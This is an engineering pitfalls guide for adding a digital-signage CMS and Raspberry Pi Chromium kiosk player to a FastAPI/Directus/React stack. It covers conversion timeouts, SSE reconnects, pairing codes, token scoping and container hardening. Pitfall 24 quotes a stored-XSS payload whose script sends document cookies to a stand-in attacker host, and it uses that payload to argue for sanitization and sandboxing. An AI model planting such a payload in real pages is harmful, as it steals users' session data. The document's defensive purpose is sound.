# Pitfalls Research — v1.16 Digital Signage

**Domain:** Digital signage CMS + Chromium-kiosk player added to existing FastAPI + Directus + React monorepo
**Researched:** 2026-04-18
**Confidence:** HIGH (existing stack invariants from v1.11/v1.15 are documented; external integration risks verified against Chromium/LibreOffice/pdf.js upstream issues through 2025)

Scope note: STACK.md covers versions, FEATURES.md covers feature taxonomy, ARCHITECTURE.md covers integration points. This file is **pure pitfalls + prevention + phase owner**.

Phase owners referenced:
- **Schema Phase** — Alembic-managed `media/playlists/playlist_items/devices/device_tags` tables
- **Backend Phase** — `/api/signage/*` routes, SSE, pairing, heartbeat
- **Conversion Phase** — PPTX → image pipeline (LibreOffice headless + pdf2image)
- **Admin UI Phase** — Signage surfaces under `/signage` (AdminOnly)
- **Player Phase** — Chromium-kiosk web page, format handlers, offline cache
- **Pi Provisioning Phase** — systemd unit, Chromium flags, kiosk boot
- **Docs Phase** — bilingual admin guide articles, operator runbook

---

## Critical Pitfalls

### Pitfall 1: LibreOffice headless hangs the conversion worker indefinitely

**What goes wrong:** A corrupt or password-protected `.pptx` makes `soffice --headless --convert-to pdf` block on a dialog that never renders; the worker occupies APScheduler's single process slot forever, and subsequent uploads queue behind it. With `--workers 1` invariant (v1.15 lesson), this kills the whole API's background processing.

**Why it happens:** LibreOffice in headless mode still tries to open interactive prompts (password, repair, macro warnings) on malformed files. There is no upstream timeout; the process only dies if killed.

**How to avoid:**
- Run conversion **outside** the APScheduler event loop via `asyncio.create_subprocess_exec("soffice", "--headless", "--convert-to", "pdf", ...)` with `asyncio.wait_for(proc.communicate(), timeout=60.0)`.
- On `TimeoutError` call `proc.kill()` then `await proc.wait()` (do not leave zombies).
- Wrap in `try/except` and mark the media row `conversion_status='failed'` with a diagnostic string.
- Use a **dedicated temp directory per conversion** (`tempfile.mkdtemp()`), clean up in `finally`. LibreOffice leaves lockfiles in `$HOME/.config/libreoffice` that deadlock concurrent instances — set `-env:UserInstallation=file:///tmp/lo_<uuid>` per invocation.

**Warning signs:** Background-job log entries show conversion start with no finish event; `ps aux | grep soffice` shows multiple live processes; media rows stuck in `conversion_status='pending'`.

**Phase to address:** Conversion Phase. Verification: upload a known-corrupt PPTX in acceptance testing and confirm it is marked `failed` within 60 seconds without blocking a second upload.

---

### Pitfall 2: subprocess.run() blocks the FastAPI event loop

**What goes wrong:** Developer writes `subprocess.run(["soffice", ...], timeout=60)` inside an async route handler or an async APScheduler job. The call blocks the single-threaded event loop; SSE connections stall, heartbeats from all 5 devices go silent, health checks flap.

**Why it happens:** `subprocess.run` is synchronous. Under `--workers 1`, any sync blocking call freezes every other concurrent request.

**How to avoid:** Use `asyncio.subprocess.create_subprocess_exec` (or `create_subprocess_shell` — but prefer the former for argv safety). Never call the sync `subprocess` module from async code. If you must (legacy lib), offload to `anyio.to_thread.run_sync(...)` or `loop.run_in_executor(None, ...)`.

**Warning signs:** During a PPTX upload, `/api/health` latency spikes to >30s; SSE clients emit `onerror` and reconnect simultaneously; APScheduler misfire warnings.

**Phase to address:** Conversion Phase + Backend Phase (code review checklist). Verification: grep `backend/` for `subprocess\.run\|subprocess\.Popen\|subprocess\.call` — zero hits outside dev scripts.

---

### Pitfall 3: Concurrent PPTX conversions exhaust RAM

**What goes wrong:** Admin uploads 5 PPTX files in quick succession. Each LibreOffice instance claims ~400–800 MB RAM; the API container OOM-kills itself (default Docker memlimit or host limit). Directus, API, and all SSE clients drop simultaneously.

**Why it happens:** LibreOffice is not lightweight; `pdf2image`/poppler on top adds another 100–200 MB per file. No built-in concurrency cap.

**How to avoid:**
- Enforce **serial conversions** via an `asyncio.Semaphore(1)` (or `Semaphore(2)` if the host has >4 GB spare). A queue of 5 files converting serially is fine for a small-fleet CMS.
- Set explicit `mem_limit` on the `api` service in `docker-compose.yml` so OOMs are local and recoverable rather than crashing the host.
- Reject uploads over a size cap (e.g. 50 MB) at the FastAPI boundary before LibreOffice touches the file.

**Warning signs:** `docker stats api` spikes near memlimit; `dmesg | grep -i oom` on the host; uploads fail mid-batch with 502.

**Phase to address:** Conversion Phase. Verification: upload 5 PPTX files concurrently; observe serial processing in logs and peak RAM < 1.5 GB.

---

### Pitfall 4: Font rendering differs between dev laptop and Docker container

**What goes wrong:** A PPTX with Calibri/Arial/custom fonts renders correctly on the admin's laptop but becomes Liberation Sans / boxes in the container-converted output. Customers see "broken" slides.

**Why it happens:** The `libreoffice` apt package in slim base images ships minimal font coverage. Microsoft fonts are not redistributable; DejaVu/Liberation are substituted automatically.

**How to avoid:**
- In the `api` (or dedicated `converter`) Dockerfile, install `fonts-liberation fonts-dejavu fonts-noto-core ttf-mscorefonts-installer` (the last requires accepting the EULA at build time via `ACCEPT_EULA`).
- Document in the admin guide: "Embed fonts in PPTX (File → Options → Save → Embed fonts)" as the supported authoring workflow. This is the only 100% deterministic fix.
- Add a visual regression gate: convert a known-good test PPTX in CI and diff against a baseline PNG.

**Warning signs:** Admin reports "fonts look wrong on the screen"; comparing uploaded vs. rendered slides shows different typefaces.

**Phase to address:** Conversion Phase (Dockerfile) + Docs Phase (embed-fonts guidance).

---

### Pitfall 5: pdf.js worker bundle missing under Vite

**What goes wrong:** Player loads a PDF; browser console shows `Setting up fake worker failed` or `pdf.worker.mjs 404`. pdf.js falls back to running in the main thread — blocks animation, first render takes 20+ seconds on large PDFs, memory doubles.

**Why it happens:** Vite does not auto-bundle pdf.js's worker. You must explicitly import the worker URL with Vite's `?url` suffix and pass it to `GlobalWorkerOptions.workerSrc`.

**How to avoid:**
```ts
import * as pdfjs from "pdfjs-dist";
import pdfjsWorker from "pdfjs-dist/build/pdf.worker.min.mjs?url";
pdfjs.GlobalWorkerOptions.workerSrc = pdfjsWorker;
```
Use the **exact same version** of `pdfjs-dist` for the worker and the main module (version mismatch throws `UnknownErrorException: The API version does not match the Worker version`).

**Warning signs:** Console error on first PDF load; PDF render > 5s; `pdf.worker` not visible in the Network tab.

**Phase to address:** Player Phase (format handlers). Verification: open DevTools on the Pi in pairing/dev mode; confirm worker loaded and request succeeds.

---

### Pitfall 6: Large PDFs exhaust browser memory on Pi 4

**What goes wrong:** A 200-page PDF loaded via pdf.js allocates one canvas per rendered page. On a Pi 4 (1–4 GB RAM, shared with GPU), Chromium tab crashes with "Aw, Snap!" and the playlist loop halts at that media item.

**Why it happens:** pdf.js renders pages to canvases by default. With page-flip, the previous and next pages are pre-rendered — that's 3 canvases × page size × 4 bytes/pixel.

**How to avoid:**
- Enforce a **page-count ceiling** at upload (e.g. `<= 50 pages`). Reject or truncate larger PDFs with a user-visible error.
- Render **one page at a time**, destroy the previous canvas before rendering the next: `page.cleanup()` and set canvas width/height to 0 before dropping the ref.
- Cap render dimensions to the display resolution (no point rendering at 300 dpi for a 1920×1080 screen).
- **Fallback strategy:** if PDF has > N pages, server-side convert to a sequence of images (same pipeline as PPTX via LibreOffice PDF→PNG) and play as an image slideshow instead of pdf.js page-flip.

**Warning signs:** Chromium tab memory > 1.5 GB in `chrome://memory-internals`; page-flip stutters; Pi swapfile thrashing.

**Phase to address:** Player Phase + Conversion Phase (image-fallback pipeline) + Admin UI Phase (page-count validation on upload).

---

### Pitfall 7: Chromium EventSource does not reliably reconnect after Pi sleeps or network drops

**What goes wrong:** Pi loses Wi-Fi for 10 minutes; comes back; Chromium's built-in `EventSource.readyState` reports `OPEN` but no new events arrive. Admin pushes a playlist change; nothing happens. Only a full page reload recovers.

**Why it happens:** Chromium's EventSource reconnect logic honors the server's `retry:` field and can get stuck in a zombie-open state after TCP keepalive failures — especially through reverse proxies that silently drop idle connections.

**How to avoid:**
- Send heartbeat comments from the server every 15 s (`yield ": keepalive\n\n"`) via `sse-starlette`'s `ping` param — this keeps the connection warm through nginx's default 60s `proxy_read_timeout`.
- In the player, run a **watchdog**: track last-received-event timestamp; if > 45 s without anything (including keepalive pings), `eventSource.close()` then create a new one.
- Layer a **polling fallback** at 30 s regardless of SSE state — if SSE is healthy, it just confirms state; if SSE is zombie, polling catches the change (hybrid is an explicit project feature).
- Server: configure `nginx` (or Directus's proxy) with `proxy_read_timeout 3600s; proxy_buffering off; chunked_transfer_encoding on;` on the `/api/signage/stream` location.

**Warning signs:** Admin-pushed changes take > 60 s to appear on a device; device `last_seen` heartbeat is current but `current_playlist_version` is stale.

**Phase to address:** Backend Phase (SSE implementation) + Player Phase (watchdog) + Pi Provisioning Phase (nginx config if custom proxy).

---

### Pitfall 8: SSE connections block the single-worker event loop if implemented sync

**What goes wrong:** Developer writes an SSE generator that does `time.sleep(30)` or issues sync DB calls between yields. With `--workers 1` (v1.15 invariant), each connected player occupies a slot; 5 Pis = the API is 100% blocked; Directus admin UI stops responding because FastAPI proxies or shares the loop.

**Why it happens:** SSE generators are long-lived; any sync blocking call inside one multiplies the damage.

**How to avoid:**
- Use `sse-starlette`'s `EventSourceResponse` with an **async generator**. Between events, `await asyncio.sleep(...)`, never `time.sleep`.
- DB access inside the generator must use `AsyncSession` (project already enforces this).
- Drive change notifications via an `asyncio.Queue` per connection (or a single `asyncio.Event`/`Condition` broadcast). Do not poll the DB inside the generator at short intervals — that's what the 30-s polling fallback is for.
- Cap concurrent connections with an `asyncio.Semaphore` acquired in the route handler; exceeding → HTTP 503 with `Retry-After`. Small-fleet scope (≤5 devices) means cap at ~10 is plenty.

**Warning signs:** `/api/health` p95 latency climbs with each connected device; graceful shutdown (`docker compose down`) hangs > 30 s.

**Phase to address:** Backend Phase. Verification: connect 5 EventSource clients and confirm `/api/health` stays < 100 ms.

---

### Pitfall 9: Chromium `--no-sandbox` default is a real attack surface

**What goes wrong:** Pi provisioning scripts copy-paste `chromium-browser --kiosk --no-sandbox http://api/signage/player` from a tutorial. `--no-sandbox` disables the renderer sandbox; a malicious iframe (signage feature allows URL embeds) can escape to the host.

**Why it happens:** Running Chromium as root on a Pi fails without `--no-sandbox`; tutorials universally add it rather than fixing the root cause.

**How to avoid:**
- Create a dedicated `signage` user on the Pi (`useradd -m signage`), run Chromium under that user via systemd `User=signage`. Then **do not** pass `--no-sandbox`.
- Sandbox is then automatically functional under non-root.
- If `--no-sandbox` is truly required (edge case), combine with `--site-per-process` and a strict `Content-Security-Policy` on the player page (`frame-src 'self' https://trusted-embeds.example.com`).

**Warning signs:** Player process running as `root` in `ps`; Chromium logs `Running as root without --no-sandbox is not supported`.

**Phase to address:** Pi Provisioning Phase + Docs Phase (image-bake checklist).

---

### Pitfall 10: Chromium boots before X/Wayland is ready → black screen

**What goes wrong:** systemd starts `chromium-kiosk.service` on boot. It fires before the graphical session is up; Chromium exits immediately; systemd disables it after 5 restart attempts. Pi boots to black screen forever.

**Why it happens:** Missing `After=graphical.target` / `Wants=graphical-session.target` and no `ExecStartPre` gate for DISPLAY availability.

**How to avoid:**
```ini
[Unit]
Description=Signage Kiosk
After=graphical.target network-online.target
Wants=graphical-session.target network-online.target

[Service]
User=signage
Environment=DISPLAY=:0
Environment=XAUTHORITY=/home/signage/.Xauthority
ExecStartPre=/bin/sh -c 'until xset -q; do sleep 1; done'
ExecStart=/usr/bin/chromium-browser --kiosk ...
Restart=on-failure
RestartSec=5

[Install]
WantedBy=graphical.target
```
On Wayland/`labwc` on Raspberry Pi OS Bookworm, use the user systemd session (`systemctl --user`) under the auto-logged-in user and target `graphical-session.target`.

**Warning signs:** `systemctl status chromium-kiosk` shows rapid-restart cycle; `journalctl` logs `cannot open display :0`.

**Phase to address:** Pi Provisioning Phase + Docs Phase.

---

### Pitfall 11: Chromium kiosk flag set is incomplete → autoplay fails, cursor visible, tab dies silently

**What goes wrong:** Videos don't autoplay (require user gesture); mouse cursor sits in the middle of the screen; if renderer crashes, tab shows "Aw, Snap!" until someone SSHes in.

**Why it happens:** Chromium kiosk defaults are browser-safe, not signage-safe.

**How to avoid — recommended full flag set for small-fleet signage on Pi 4:**
```
--kiosk
--noerrdialogs
--disable-infobars
--disable-translate
--disable-features=TranslateUI,InfiniteSessionRestore,AutofillServerCommunication
--no-first-run
--fast
--fast-start
--disable-pinch
--overscroll-history-navigation=0
--autoplay-policy=no-user-gesture-required
--start-fullscreen
--password-store=basic
--check-for-update-interval=31536000
--disable-session-crashed-bubble
--disk-cache-dir=/home/signage/.cache/chromium
--disk-cache-size=524288000         # 500 MB cap
--incognito=false                   # need persistent cache for offline
--enable-features=OverlayScrollbar
```
Cursor hide: install `unclutter-xfixes` and run `unclutter -idle 0.1 -root &` from the session startup — more reliable than CSS `cursor: none` (which still shows a cursor briefly on page transitions).

Tab-crash recovery: wrap Chromium in a shell loop or use systemd `Restart=always`; add a client-side watchdog in the player that reloads on `visibilitychange` errors.

**Warning signs:** Videos show a play button; cursor visible after hover; "Aw Snap!" persistent.

**Phase to address:** Pi Provisioning Phase + Player Phase (watchdog + autoplay-friendly video tag with `muted playsinline autoplay`).

---

### Pitfall 12: 4K images blow up GPU memory on Pi 4

**What goes wrong:** Admin uploads native 4K (3840×2160) photographs. Chromium decodes each into GPU memory; transitioning between two 4K images allocates ~120 MB of VRAM; Pi 4's shared GPU memory is typically 128–256 MB. Tab crashes or fades go janky.

**Why it happens:** No server-side downscale; client trusts whatever is uploaded.

**How to avoid:**
- Server-side **downscale and re-encode** on upload using Pillow/pyvips: generate a 1920×1080 (or 2560×1440) delivery variant alongside the original. The player fetches the variant; original is retained for download.
- Strip EXIF; re-encode to `image/jpeg` quality 85 or `image/webp` quality 80.
- Decorate `<img>` with `decoding="async" loading="eager"` and enforce `object-fit: contain` with `max-width: 100vw`.

**Warning signs:** Memory pressure warnings in `chrome://gpu`; fades drop below 30 fps.

**Phase to address:** Conversion Phase (image variants) + Admin UI Phase (upload pipeline).

---

### Pitfall 13: 6-digit pairing codes collide

**What goes wrong:** With only 10⁶ = 1,000,000 codes and human-readable (often excluding `0/O`, `1/I/l`) the effective space shrinks to ~500k. A race between two fresh Pis generates the same code; the admin claims "code 428193" and pairs the wrong device.

**Why it happens:** No uniqueness check on generation; no TTL; no rate limit.

**How to avoid:**
- Generate codes with `secrets.choice` from a non-confusing alphabet (`23456789ABCDEFGHJKMNPQRSTUVWXYZ`, 31 chars, 6 positions = ~887M combinations).
- Enforce `UNIQUE` constraint at the DB level on `pairing_codes.code` **only among unexpired rows** (partial index: `CREATE UNIQUE INDEX ... WHERE expires_at > now() AND claimed_at IS NULL`).
- Short TTL (5–10 minutes); regenerate on expiry.
- On collision, retry generation up to 5 times, then 500.
- Rate-limit pairing-code generation per Pi source-IP (abuse prevention).

**Warning signs:** Alembic migration history lacks the partial-unique index; admin reports "I paired the wrong device."

**Phase to address:** Schema Phase (partial unique index) + Backend Phase (generation + TTL) + Player Phase (code refresh on expiry).

---

### Pitfall 14: Pairing race condition — Pi polls before or after admin claims

**What goes wrong:** Pi displays code `ABC123`, polls `/api/signage/pair/status?code=ABC123` every 3 s. Admin enters code at second 2.7. Timing window:
- Pi polls at 3 s → sees `pending` (admin's claim not yet committed).
- Pi polls at 6 s → but admin's claim expired the code at 3.1 s (if naive) or another Pi somehow saw the code.
Alternatively: admin claims; Pi never polls again because its network dropped; orphaned `device_token` never gets delivered.

**Why it happens:** No durable state transitions; polling + claim not atomic.

**How to avoid:**
- State machine: `pending → claimed → delivered → active`. Do not expire on claim; expire only on TTL or explicit revoke.
- Claim endpoint (admin): `UPDATE pairing_codes SET claimed_at=now(), claimed_by_user=:user, target_device_id=:new_device_id WHERE code=:code AND claimed_at IS NULL RETURNING ...`. Atomic.
- Poll endpoint (Pi): returns `{status: claimed, device_token: ..., device_id: ...}` once; server marks `delivered_at` on response.
- If `claimed_at` but not `delivered_at` after 10 min → alert admin "device did not come online" in UI.
- Pi retains the code across reboots in `/var/lib/signage/pending.json` — if Pi reboots mid-pair, it resumes polling.

**Warning signs:** Admin UI shows "claimed but offline" devices accumulating; duplicate `device_id` rows.

**Phase to address:** Schema Phase + Backend Phase + Player Phase (persistent pairing state).

---

### Pitfall 15: Directus file storage path vs. URL mismatch

**What goes wrong:** Developer assumes `directus_files.filename_disk` is relative to a known path. In fact Directus stores files under `<STORAGE_LOCAL_ROOT>/<uuid>` (or S3 key). Backend tries to `open()` the uploaded PPTX at the filename; `FileNotFoundError`.

**Why it happens:** Directus abstracts storage; `filename_disk` is the disk-side key, not a path relative to `/uploads`. URL is `/assets/<uuid>` served by Directus, not the backend.

**How to avoid:**
- **Option A (recommended):** Do not read Directus files from disk. Have the admin UI upload media **directly to the FastAPI backend**, which stores the bytes under a backend-owned volume (e.g. `/app/media/<uuid>.<ext>`). Directus is used only for the `media` table metadata (joined via `directus.items(...)` or direct SQL).
- **Option B:** Share the Directus upload volume between both containers (`volumes: - directus_uploads:/app/uploads:ro` on api, read-only). Backend reads by `filename_disk`.
- Either way: **never** store user-facing URLs that reference Directus's internal UUID paths — add a stable backend URL like `/api/signage/media/<id>/file` that internally resolves.

Option A cleanly separates concerns (Directus is just auth + UI chrome here, not the file store) and aligns with the v1.11 precedent where Alembic owns app schema and Directus is deliberately kept shallow.

**Warning signs:** Conversion worker throws `FileNotFoundError`; media URLs break when Directus is restarted or migrated.

**Phase to address:** Schema Phase (decide storage strategy) + Backend Phase (upload endpoint) + Admin UI Phase (upload form targets `/api/signage/media` not Directus `/files`).

---

### Pitfall 16: Deleting a media item in the admin UI orphans the underlying file

**What goes wrong:** Admin deletes "Lobby Welcome.mp4" from the signage library. Row removed from `media` table. Underlying 80 MB file still sits on disk. After 6 months, disk full.

**Why it happens:** Foreign-key cascade handles rows, not side-effect files.

**How to avoid:**
- Backend `DELETE /api/signage/media/:id` route: in a single transaction, delete DB row, then delete file from disk (`os.unlink`, ignore `FileNotFoundError`), then delete derived artifacts (PPTX→image slides, PDF→image pages).
- If a playlist references the media item, refuse deletion with 409 and list blocking playlists (RESTRICT FK) — do not silently orphan playlist_items either.
- Nightly cleanup job: enumerate files on disk, compare to `media.filename_disk` set; delete files with no DB row older than 24 h (grace period avoids races with in-flight uploads).

**Warning signs:** `du -sh /app/media` grows faster than `count(*) from media`.

**Phase to address:** Backend Phase (delete semantics) + Admin UI Phase (confirm dialog + "in use by N playlists" warning) + Schema Phase (FK `ON DELETE RESTRICT` on `playlist_items.media_id`).

---

### Pitfall 17: Permissions issues on shared volume between containers

**What goes wrong:** Directus container runs as UID 998; api container runs as UID 1000. Backend tries to write a derived image next to the original PPTX → `PermissionError`. Or Directus uploads a file → backend can read but cannot delete during media removal.

**Why it happens:** Docker named volumes preserve UIDs; no automatic harmonization.

**How to avoid:**
- If using Option A (backend-owned storage, per Pitfall 15), volume is owned by the api container's UID — no conflict. Recommended.
- If sharing: in the api Dockerfile, create a user with the same UID as Directus's internal user (`useradd -u 998 app`), or vice versa. Document this UID lock in `docker-compose.yml` with a comment.
- Avoid `chown -R` in entrypoints — slow on large volumes.

**Warning signs:** Intermittent `PermissionError` in logs; `ls -la` on the shared volume shows mixed UIDs.

**Phase to address:** Backend Phase / Infra sub-phase. Verification: `docker compose exec api touch /app/media/test && docker compose exec directus rm /app/media/test` succeeds.

---

### Pitfall 18: Browser cache is not a reliable offline store on Pi kiosks

**What goes wrong:** Developer relies on HTTP cache headers (`Cache-Control: max-age=604800`) for offline playback. Chromium evicts the cache under memory pressure or on restart; Pi reboots nightly (common practice); cache is empty → black screen when network is down.

**Why it happens:** HTTP cache is a performance tool, not a persistence tool. Eviction policy is not developer-controllable.

**How to avoid — file-based cache on the Pi:**
- Install a tiny Python or Node sidecar service on the Pi (same systemd, before Chromium) that:
  1. Polls `/api/signage/playlist?device_token=...` every 30 s.
  2. Writes manifest JSON to `/var/lib/signage/playlist.json`.
  3. Downloads each referenced media file to `/var/lib/signage/media/<id>.<ext>` if not present (ETag/size check).
  4. Garbage-collects files no longer in the manifest after a 7-day grace.
- The player page loads the manifest via `file:///var/lib/signage/playlist.json` or via a tiny `localhost:8080` static file server the sidecar runs. When online, it overlays with the live API; when offline, it falls back to the local cache.
- Do **not** use Service Workers for this — they require HTTPS on non-localhost (painful on LAN-only deployments without internal CA + cert distribution) and cache quota is still browser-managed.
- Signal offline explicitly: sidecar writes `online=true/false` to a status file; player renders a discreet corner indicator when offline for ops visibility (not user-visible normally).

**Warning signs:** Pi behind a broken Wi-Fi shows black screen rather than looping cached content.

**Phase to address:** Pi Provisioning Phase (sidecar) + Player Phase (manifest-driven playback) + Docs Phase (sidecar architecture).

---

### Pitfall 19: Alembic/Directus schema-ownership race at deployment

**What goes wrong (v1.11 lesson restated for signage):** `docker compose up` starts `migrate` and `directus` in parallel. Directus runs schema introspection; if signage tables already exist but its `directus_collections` snapshot doesn't, it may try to re-register them or present them for deletion in the admin UI. Alternately: Directus starts first on a fresh DB, creates its own tables, then Alembic finds an unexpected state.

**Why it happens:** Directus introspects the entire PG schema on boot; order matters.

**How to avoid:**
- `depends_on` with `condition: service_completed_successfully` on the `migrate` one-shot service for both `api` and `directus`. Directus must not start until Alembic finishes.
- Extend `directus/snapshot.yml` with explicit "hide" entries for each new signage table (`media`, `playlists`, `playlist_items`, `devices`, `device_tags`, `pairing_codes`, `device_heartbeats`) — follows the v1.11 pattern keeping Alembic as schema source of truth.
- Adding tables during live deployment: run Alembic migration manually via `docker compose run --rm migrate` before `docker compose up -d api directus`. Do not rely on a rolling restart to order things correctly.

**Warning signs:** Directus admin UI shows new signage tables as "collections to configure"; Alembic history inconsistent; `alembic current` on restart differs from `alembic heads`.

**Phase to address:** Schema Phase + Docs Phase (deployment runbook update).

---

### Pitfall 20: Missing DE keys surface at runtime (v1.15 lesson)

**What goes wrong:** Signage admin UI labels like `signage.media.uploadTitle` exist in `en.json` but not in `de.json`. A German-locale admin sees `signage.media.uploadTitle` literal on screen. Embarrassing; caught only by manual DE smoke test.

**Why it happens:** Developer adds keys to `en.json` while iterating; forgets the DE parity pass until the end; CI doesn't enforce parity.

**How to avoid:**
- Add a CI script (extend the v1.13 pattern): `scripts/check-i18n-parity.mjs` — parses both locale files, diffs key sets, exits non-zero on asymmetry. Wire into the pre-commit hook.
- Admin-facing signage UI needs **full DE/EN parity**; player UI is media-driven and intentionally text-free, so i18n scope is limited to admin surfaces + a small handful of player status overlays (pairing code, "Offline", loading state).
- Author DE keys in the informal "du" tone (project convention).

**Warning signs:** Runtime console warnings `i18next::translator: missingKey de translation signage.*`; visual regressions in DE screenshots.

**Phase to address:** Admin UI Phase + Docs Phase (admin guide DE/EN). Verification: CI parity check green; run UI in `lang=de` and eye-check all signage screens.

---

### Pitfall 21: Device token leaks cross-device playlist data

**What goes wrong:** Backend route `/api/signage/playlist?device_token=...` returns the playlist for the token's device. Developer naively implements it as `SELECT * FROM playlists JOIN ... WHERE device_token = :token` — but forgets to scope media items, or returns the token's `device_id` in a way that lets a curious device enumerate others via `/api/signage/devices/:id`.

**Why it happens:** Device tokens feel "server-to-server" but they live on a $50 Pi that could be physically stolen.

**How to avoid:**
- Device tokens: short-lived JWT (24 h) signed with HS256, claims `{sub: device_id, scope: "device", iat, exp}`. **Scope is enforced at every route** — a device token can ONLY hit `/api/signage/player/*` routes (playlist fetch, heartbeat, media file download). 403 on admin/other-device routes.
- **Rotation:** on each heartbeat, if token is within 2 h of expiry, issue a fresh one in the response body (`{heartbeat_ack, new_token?}`). Pi persists the new token. Old tokens revoked after a 1-h grace (overlap).
- Physical-theft mitigation: admin UI has "Revoke device" button → sets `devices.revoked_at = now()`; middleware rejects tokens for revoked devices.
- Media downloads signed with a per-request short-lived token derived from the device token — prevents token-less URL sharing.

**Warning signs:** Tokens never change; security audit finds `device_token` in Git log; device that was physically lost still reaches the API.

**Phase to address:** Backend Phase (auth middleware) + Admin UI Phase (revoke button) + Player Phase (token rotation).

---

### Pitfall 22: Malicious PPTX exploits LibreOffice CVE

**What goes wrong:** Admin uploads an attacker-supplied PPTX that triggers a LibreOffice heap overflow (CVE-2024-xxxx class); RCE inside the conversion container. From there, network reach to Directus DB.

**Why it happens:** LibreOffice has a long history of file-parsing CVEs; internal-use assumption is weaker than users think.

**How to avoid:**
- Run the conversion worker in a **dedicated container** (not the api container): minimal base image, no network access to Directus or DB, only a one-way write to a shared `media` volume and read from an `uploads` volume.
- `read_only: true` rootfs with `tmpfs` for `/tmp` in `docker-compose.yml`.
- `security_opt: ["no-new-privileges:true"]`, `cap_drop: [ALL]`.
- Keep LibreOffice patched — tie Dockerfile to `debian:stable-slim` (auto security updates on rebuild).
- Even for "admin-only upload": a compromised admin laptop is a valid threat model.

**Warning signs:** CVE-2024/2025/2026 LibreOffice advisories not tracked; no network segmentation between conversion and DB.

**Phase to address:** Conversion Phase (container hardening) + Docs Phase (security section).

---

### Pitfall 23: iframe embeds break via X-Frame-Options / CSP

**What goes wrong:** Admin creates a "Web URL" media item pointing to `https://some-dashboard.example.com`. Player loads it in an iframe; browser blocks with `Refused to display in a frame because an ancestor violates the following Content Security Policy directive: "frame-ancestors"`. Black square on the signage screen.

**Why it happens:** Many sites send `X-Frame-Options: DENY` or `SAMEORIGIN`, or CSP `frame-ancestors 'none'`. The signage player cannot override headers sent by the target server.

**How to avoid:**
- **Admin UI pre-flight check:** when adding a Web URL, backend issues a `HEAD` request, inspects headers, and warns "This site may refuse embedding" if `X-Frame-Options` is present or CSP blocks embedding.
- For trusted internal dashboards: the site owner must explicitly allow your signage origin (`Content-Security-Policy: frame-ancestors https://signage.internal`). Document this requirement in the admin guide.
- Fallback: offer a "screenshot mode" — server-side headless-Chromium snapshot every N minutes, displayed as an image. Out of scope for v1.16 but worth noting for v1.17.

**Warning signs:** Admin reports "the URL is blank on the screen"; DevTools console on the Pi shows frame-ancestors errors.

**Phase to address:** Admin UI Phase (pre-flight check) + Docs Phase (embedding requirements).

---

### Pitfall 24: HTML-snippet media item → stored XSS on the kiosk

**What goes wrong:** Admin pastes `<script>fetch('http://attacker/x?c='+document.cookie)</script>` (or a benign-looking iframe that loads malicious JS) into an HTML snippet. The signage player renders it via `dangerouslySetInnerHTML`; the script runs in the player origin, can call `/api/signage/*` with the device token visible in JS context, exfiltrate, or pivot.

**Why it happens:** "Admin-only" is an AuthN perimeter, not a scripting perimeter. A compromised admin session, or a malicious insider, trivially weaponizes HTML snippets.

**How to avoid:**
- **Sanitize server-side** with `nh3` (already in project dependencies from v1.1 logo sanitization) — same philosophy: allow a small tag/attr whitelist, strip `<script>`, `on*` handlers, `javascript:` URIs.
- Render snippets in a **sandboxed iframe** with `sandbox="allow-scripts"` (no same-origin, no top-navigation). The snippet runs in a null origin and cannot reach the player's token.
- Never put the device token in `localStorage` / accessible JS scope; keep it in an `HttpOnly` cookie OR inject via a separate fetch-layer that the snippet iframe cannot access.
- Admin UI: label the HTML snippet field clearly with security implications; default to a code editor with a preview showing sanitized output.

**Warning signs:** Snippet fields allow `<script>`; no iframe sandboxing; device token visible via `document.cookie` on the player.

**Phase to address:** Backend Phase (sanitization) + Player Phase (sandbox iframe) + Admin UI Phase (editor + preview).

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Skip conversion container isolation; run LibreOffice in `api` | One fewer service in compose | Shared event loop, RAM competition, CVE blast radius expanded to API | Never for production; OK for Phase 1 prototype only |
| Use `subprocess.run` with `asyncio.to_thread` instead of `asyncio.subprocess` | Simpler porting of existing scripts | Thread-pool saturation, harder timeout/kill semantics | Only for sub-1s sync tools (never for LibreOffice) |
| Store media files in Directus storage rather than backend-owned | Upload UI "free" via Directus admin | Path/UUID mismatch (Pitfall 15), harder deletes, cross-container permission issues (Pitfall 17) | Never — keep Alembic/backend as source of truth, matches v1.11 pattern |
| Use HTTP cache + Service Worker for offline | No Pi sidecar to build | Cache eviction = black screen, HTTPS requirement on LAN | Never for kiosk offline; acceptable for admin UI offline-view |
| Ship without SSE heartbeat / watchdog, rely on polling only | Simpler | 30-s delay on every push; worse UX; masks real SSE bugs | OK as v1.16 MVP milestone if time-boxed — fix in v1.17 |
| Skip page-count cap on PDF uploads | Simpler upload form | Tab crashes on Pi, silent playlist breakage | Never |
| 6-digit digits-only pairing codes | Familiar UX | Collision risk (Pitfall 13) | Only with partial-unique index + 5-min TTL + retry |
| `--no-sandbox` on Chromium | Works as root out-of-the-box | CVE escalation path | Never for production; document non-root setup |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Directus + Alembic (v1.11 lesson) | Let Directus create signage collections via its UI | Alembic creates tables; snapshot.yml hides them from Data Model UI |
| APScheduler + PPTX conversion | Schedule conversion as a periodic job | Run as one-off `asyncio.create_task` on upload; semaphore-gated |
| pdf.js + Vite | Import `pdfjs-dist` without explicit worker URL | `import workerUrl from "pdfjs-dist/build/pdf.worker.min.mjs?url"` |
| sse-starlette + `--workers 1` | Long-running sync work inside EventSourceResponse generator | Async generator + `asyncio.Queue` broadcaster + ping interval |
| Docker Compose + PG + Directus + migrate | Start all services in parallel | `service_completed_successfully` on migrate; api and directus both depend on it |
| Fernet-encrypted device secrets (v1.15 pattern) | Reuse encryption key for device tokens | Device tokens are JWT (HS256, separate secret); Fernet reserved for stored credentials (SNMP community strings, Personio key) |
| Chromium + systemd on Pi | `After=network.target` (not online) | `After=graphical.target network-online.target` + `ExecStartPre` DISPLAY gate |
| Chromium cache + nightly reboot | Assume browser cache survives | Ship explicit file-based cache sidecar |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Serving full-resolution images to 1080p screens | GPU memory pressure, fade stutters | Server-side downscale variants | 4K images on Pi 4 (immediate) |
| Per-device DB polling inside SSE generator | API CPU climbs with device count | `asyncio.Queue` broadcast from a single change-listener | > 3 devices |
| No concurrency cap on PPTX conversion | OOM-kill of api container | `asyncio.Semaphore(1)` + 50 MB upload cap | ≥ 2 concurrent uploads |
